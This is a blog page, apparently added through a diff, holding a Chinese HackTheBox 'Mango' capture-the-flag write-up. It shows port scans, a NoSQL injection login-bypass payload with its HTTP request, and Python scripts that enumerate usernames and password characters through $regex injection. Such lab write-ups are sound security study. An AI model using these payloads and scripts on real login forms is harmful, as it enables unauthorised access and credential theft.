@@ -1,0 +1,813 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="shiyan">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="0x00 靶场技能介绍章节技能：NoSQL数据库登录绕过、NoSQL注入、NoSQL用户名和密码枚举、suid提权、jjs提权">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Mango-htb-writeup">
+<meta property="og:url" content="https://sh1yan.top/2024/01/09/Mango-htb-writeup/index.html">
+<meta property="og:site_name" content="sh1yan&#39;blog">
+<meta property="og:description" content="0x00 靶场技能介绍章节技能：NoSQL数据库登录绕过、NoSQL注入、NoSQL用户名和密码枚举、suid提权、jjs提权">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://sh1yan.top/photo/Mango-htb-writeup/1.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Mango-htb-writeup/2.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Mango-htb-writeup/3.png">
+<meta property="article:published_time" content="2024-01-09T15:50:55.000Z">
+<meta property="article:modified_time" content="2024-01-30T09:33:07.883Z">
+<meta property="article:author" content="shiyan">
+<meta property="article:tag" content="shooting-range">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://sh1yan.top/photo/Mango-htb-writeup/1.png">
+  
+  
+  
+  <title>Mango-htb-writeup - sh1yan&#39;blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"sh1yan.top","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>sh1yan&#39;blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/yqlj/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item dropdown">
+              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
+                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                <i class="iconfont icon-th-large"></i>
+                <span>其他</span>
+              </a>
+              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/open-source/" target="_self">
+                    
+                    <span>我开源的安全项目</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/rt-cmd/" target="_self">
+                    
+                    <span>反弹shell命令集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/P2note/" target="_self">
+                    
+                    <span>综合安全工具集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/WebDeveloper/" target="_self">
+                    
+                    <span>网站开发者工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/linux-command/" target="_self">
+                    
+                    <span>Linux命令工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/CyberChef/" target="_self">
+                    
+                    <span>CyberChef工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/Quick-Reference/" target="_self">
+                    
+                    <span>开发者速查备忘录</span>
+                  </a>
+                
+              </div>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Mango-htb-writeup"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-01-09 23:50" pubdate>
+          2024年1月9日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          16k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          134 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Mango-htb-writeup</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h4 id="0x00-靶场技能介绍"><a href="#0x00-靶场技能介绍" class="headerlink" title="0x00 靶场技能介绍"></a>0x00 靶场技能介绍</h4><p>章节技能：NoSQL数据库登录绕过、NoSQL注入、NoSQL用户名和密码枚举、suid提权、jjs提权</p>
+<span id="more"></span>  
+
+<p>参考链接：<code>https://fdlucifer.github.io/2020/04/20/mango/</code></p>
+<p>参考链接：<code>https://0xdf.gitlab.io/2020/04/18/htb-mango.html</code></p>
+<h4 id="0x01-用户权限获取"><a href="#0x01-用户权限获取" class="headerlink" title="0x01 用户权限获取"></a>0x01 用户权限获取</h4><p>1、获取下靶机IP地址：10.10.10.162</p>
+<p>2、扫描下开放端口情况：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ sudo nmap -p- -Pn --min-rate=10000 -oG allport 10.10.10.162     <br>[sudo] kali 的密码：<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-09 20:35 CST<br>Warning: 10.10.10.162 giving up on port because retransmission <span class="hljs-built_in">cap</span> hit (10).<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.162<br>Host is up (1.1s latency).<br>Not shown: 63824 closed tcp ports (reset), 1708 filtered tcp ports (no-response)<br>PORT    STATE SERVICE<br>22/tcp  open  ssh<br>80/tcp  open  http<br>443/tcp open  https<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 39.51 seconds<br><br>┌──(kali㉿kali)-[~/桌面]<br>└─$ sudo nmap -sV -sC -p22,80,443 -Pn --min-rate=10000 10.10.10.162<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-09 20:36 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.162<br>Host is up (0.32s latency).<br><br>PORT    STATE SERVICE  VERSION<br>22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   2048 a8:8f:d9:6f:a6:e4:ee:56:e3:ef:54:54:6d:56:0c:f5 (RSA)<br>|   256 6a:1c:ba:89:1e:b0:57:2f:fe:63:e1:61:72:89:b4:cf (ECDSA)<br>|_  256 90:70:fb:6f:38:ae:dc:3b:0b:31:68:64:b0:4e:7d:c9 (ED25519)<br>80/tcp  open  http     Apache httpd 2.4.29<br>|_http-title: 403 Forbidden<br>|_http-server-header: Apache/2.4.29 (Ubuntu)<br>443/tcp open  ssl/http Apache httpd 2.4.29 ((Ubuntu))<br>| tls-alpn: <br>|_  http/1.1<br>|_http-title: Mango | Search Base<br>|_ssl-<span class="hljs-built_in">date</span>: TLS randomness does not represent time<br>| ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN<br>| Not valid before: 2019-09-27T14:21:19<br>|_Not valid after:  2020-09-26T14:21:19<br>|_http-server-header: Apache/2.4.29 (Ubuntu)<br>Service Info: Host: 10.10.10.162; OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 31.40 seconds<br><br>┌──(kali㉿kali)-[~/桌面]<br>└─$ sudo nmap -p- -Pn -sU --min-rate=10000 -oG allport1 10.10.10.162<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-09 20:37 CST<br>Warning: 10.10.10.162 giving up on port because retransmission <span class="hljs-built_in">cap</span> hit (10).<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.162<br>Host is up (0.64s latency).<br>All 65535 scanned ports on 10.10.10.162 are <span class="hljs-keyword">in</span> ignored states.<br>Not shown: 65455 open|filtered udp ports (no-response), 80 closed udp ports (port-unreach)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 87.38 seconds<br></code></pre></td></tr></table></figure>
+
+<p>3、本地绑定下，发现的域名情况</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;10.10.10.162 mango.htb&quot;</span> | sudo <span class="hljs-built_in">tee</span> -a /etc/hosts<br>10.10.10.162 mango.htb<br><br>┌──(kali㉿kali)-[~/桌面]<br>└─$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;10.10.10.162 staging-order.mango.htb&quot;</span> | sudo <span class="hljs-built_in">tee</span> -a /etc/hosts<br>[sudo] kali 的密码：<br>10.10.10.162 staging-order.mango.htb<br></code></pre></td></tr></table></figure>
+
+<p>4、分别访问下域名情况</p>
+<p><code>https://mango.htb</code></p>
+<p><img src="http://sh1yan.top/photo/Mango-htb-writeup/1.png" srcset="/img/loading.gif" lazyload></p>
+<p><code>https://staging-order.mango.htb</code></p>
+<p><img src="http://sh1yan.top/photo/Mango-htb-writeup/2.png" srcset="/img/loading.gif" lazyload></p>
+<p>5、通过尝试，发现 staging-order.mango.htb 域名，使用的是一个 NoSQL 数据库的格式，存在SQL注入绕过的问题</p>
+<p><code>https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection#exploits</code></p>
+<p><code>username[$ne]=shiyan&amp;password[$ne]=shiyan&amp;login=login</code></p>
+<p>6、这里尝试绕过登录下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST / HTTP/1.1<br>Host: staging-order.mango.htb<br>User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Accept-Encoding: gzip, deflate, br<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 41<br>Origin: http://staging-order.mango.htb<br>Connection: close<br>Referer: http://staging-order.mango.htb/<br>Cookie: PHPSESSID=tn04egm4dh8ov0s168f17e229p<br>Upgrade-Insecure-Requests: 1<br><br>username[<span class="hljs-variable">$ne</span>]=shiyan&amp;password[<span class="hljs-variable">$ne</span>]=shiyan&amp;login=login<br><br>HTTP/1.1 302 Found<br>Date: Tue, 09 Jan 2024 13:02:58 GMT<br>Server: Apache/2.4.29 (Ubuntu)<br>Expires: Thu, 19 Nov 1981 08:52:00 GMT<br>Cache-Control: no-store, no-cache, must-revalidate<br>Pragma: no-cache<br>location: home.php<br>Content-Length: 4022<br>Connection: close<br>Content-Type: text/html; charset=UTF-8<br></code></pre></td></tr></table></figure>
+
+<p>7、跳转到 home.php 目录，且页面上有些提示信息</p>
+<p><code>http://staging-order.mango.htb/home.php</code></p>
+<p><img src="http://sh1yan.top/photo/Mango-htb-writeup/3.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">Under Plantation<br>Sorry <span class="hljs-keyword">for</span> the inconvenience. We just started farming!<br>To contact us <span class="hljs-keyword">in</span> the meantime please email: admin@mango.htb<br>We rarely look at our inboxes.<br></code></pre></td></tr></table></figure>
+
+<p>8、这里考察是 NoSQL 注入，获取到目标的用户名和密码的内容，下面的具体枚举的章节内容：</p>
+<p><code>用b.*替换a.*返回200响应，这意味着没有包含b的用户名。编写一个使用此逻辑发现用户名的脚本。</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">from requests import post<br>from string import lowercase<br>url = <span class="hljs-string">&#x27;http://staging-order.mango.htb/&#x27;</span><br>def sendPayload():<br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> lowercase:<br>        regex = <span class="hljs-string">&#x27;&#123;&#125;.*&#x27;</span>.format(char)<br>        data = &#123; <span class="hljs-string">&#x27;username[$regex]&#x27;</span> : regex, <span class="hljs-string">&#x27;password[$ne]&#x27;</span> : <span class="hljs-string">&#x27;password&#x27;</span>, <span class="hljs-string">&#x27;login&#x27;</span> : <span class="hljs-string">&#x27;login&#x27;</span> &#125;<br>        response = post(url, data = data, allow_redirects=False)<br>        <span class="hljs-keyword">if</span> response.status_code == 302:<br>            <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Found valid letter: &#123;&#125;&quot;</span>.format(char)<br>def getUser():<br>    sendPayload()<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    getUser()<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ python2 enum.py<br>Found valid letter: a<br>Found valid letter: d<br>Found valid letter: g<br>Found valid letter: i<br>Found valid letter: m<br>Found valid letter: n<br>Found valid letter: o<br></code></pre></td></tr></table></figure>
+
+<p><code>脚本发现了7个有效字符，即a、d、g、i、m、n、o。现在已经减少了字符集，可以尝试显示实际的用户名。regex中的插入符号^用于标记单词的开头。例如，模式^a.*仅当用户名以a开头时才返回true。 类似地，模式^ad.*如果以ad开头的用户名存在，则返回true，以此类推。使用这个逻辑更新脚本。</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">from requests import post<br>from string import lowercase<br>url = <span class="hljs-string">&#x27;http://staging-order.mango.htb/&#x27;</span><br>valid = [<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-string">&#x27;g&#x27;</span>, <span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-string">&#x27;m&#x27;</span>, <span class="hljs-string">&#x27;n&#x27;</span>, <span class="hljs-string">&#x27;o&#x27;</span>]<br>def sendPayload(word):<br>    regex = <span class="hljs-string">&#x27;^&#123;&#125;.*&#x27;</span>.format(word)<br>    data = &#123; <span class="hljs-string">&#x27;username[$regex]&#x27;</span> : regex, <span class="hljs-string">&#x27;password[$ne]&#x27;</span> : <span class="hljs-string">&#x27;password&#x27;</span>, <span class="hljs-string">&#x27;login&#x27;</span> : <span class="hljs-string">&#x27;login&#x27;</span> &#125;<br>    response = post(url, data = data, allow_redirects=False)<br>    <span class="hljs-keyword">if</span> response.status_code == 302:<br>        <span class="hljs-built_in">return</span> word<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">return</span> None<br>def getUser():<br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> valid:<br>        <span class="hljs-keyword">if</span> sendPayload(char) != None:<br>            <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Found username starting with &#123;&#125;&quot;</span>.format(char)<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    getUser()<br></code></pre></td></tr></table></figure>
+
+<p><code>脚本循环遍历字符集，查找以这些字母中的任何一个开头的用户名。</code><br><code>运行脚本后出现下面的结果</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ <span class="hljs-built_in">touch</span> enum1.py<br><br>┌──(kali㉿kali)-[~/桌面]<br>└─$ python2 enum1.py<br>Found username starting with a<br>Found username starting with m<br></code></pre></td></tr></table></figure>
+
+<p><code>发现DB分别包含以a和m开头的用户名。更新脚本以显示真正的用户名。</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">from requests import post<br>from string import lowercase<br>url = <span class="hljs-string">&#x27;http://staging-order.mango.htb/&#x27;</span><br>valid = [<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-string">&#x27;g&#x27;</span>, <span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-string">&#x27;m&#x27;</span>, <span class="hljs-string">&#x27;n&#x27;</span>, <span class="hljs-string">&#x27;o&#x27;</span>]<br>def sendPayload(word):<br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> valid:<br>        regex = <span class="hljs-string">&#x27;^&#123;&#125;.*&#x27;</span>.format(word + char)<br>        data = &#123; <span class="hljs-string">&#x27;username[$regex]&#x27;</span> : regex, <span class="hljs-string">&#x27;password[$ne]&#x27;</span> : <span class="hljs-string">&#x27;password&#x27;</span>, <span class="hljs-string">&#x27;login&#x27;</span> : <span class="hljs-string">&#x27;login&#x27;</span> &#125;<br>        response = post(url, data = data, allow_redirects=False)<br>        <span class="hljs-keyword">if</span> response.status_code == 302:<br>            <span class="hljs-built_in">return</span> char<br>    <span class="hljs-built_in">return</span> None<br>def getUser():<br>    <span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> [<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;m&#x27;</span>]:<br>        username = ch<br>        <span class="hljs-keyword">while</span> True:<br>            char = sendPayload(username)<br>            <span class="hljs-keyword">if</span> char != None:<br>                username += char<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Username found: &#123;&#125;&quot;</span>.format(username)<br>                <span class="hljs-built_in">break</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    getUser()<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ <span class="hljs-built_in">touch</span> enum2.py<br><br>┌──(kali㉿kali)-[~/桌面]<br>└─$ python2 enum2.py<br>Username found: admin<br>Username found: mango<br></code></pre></td></tr></table></figure>
+
+<p><code>脚本循环遍历有效字符并查找以a和m开头的用户名。</code></p>
+<p><code>包含302状态码(URL重定向)的HTTP响应包含一个有效字符，该脚本输出结果如下。</code></p>
+<p><code>标识了两个有效的用户名，admin和mango。可以尝试使用相同的逻辑来识别他们的密码。</code></p>
+<p><code>修改脚本如下所示</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">from requests import post<br>from string import printable<br>url = <span class="hljs-string">&#x27;http://staging-order.mango.htb/&#x27;</span><br>def sendPayload(user):<br>    valid = []<br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> printable:<br>        regex = <span class="hljs-string">&#x27;&#123;&#125;.*&#x27;</span>.format(char)<br>        data = &#123; <span class="hljs-string">&#x27;username&#x27;</span> : user, <span class="hljs-string">&#x27;password[$regex]&#x27;</span> : regex, <span class="hljs-string">&#x27;login&#x27;</span> : <span class="hljs-string">&#x27;login&#x27;</span> &#125;<br>        response = post(url, data = data, allow_redirects=False)<br>        <span class="hljs-keyword">if</span> response.status_code == 302:<br>            valid.append(char)<br>    <span class="hljs-built_in">return</span> valid<br>def getUser():<br>    <span class="hljs-keyword">for</span> user <span class="hljs-keyword">in</span> [<span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;mango&#x27;</span>]:<br>        valid = sendPayload(user)<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Valid characters for &#123;&#125;: &#123;&#125;&quot;</span>.format(user, valid)<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    getUser()<br></code></pre></td></tr></table></figure>
+
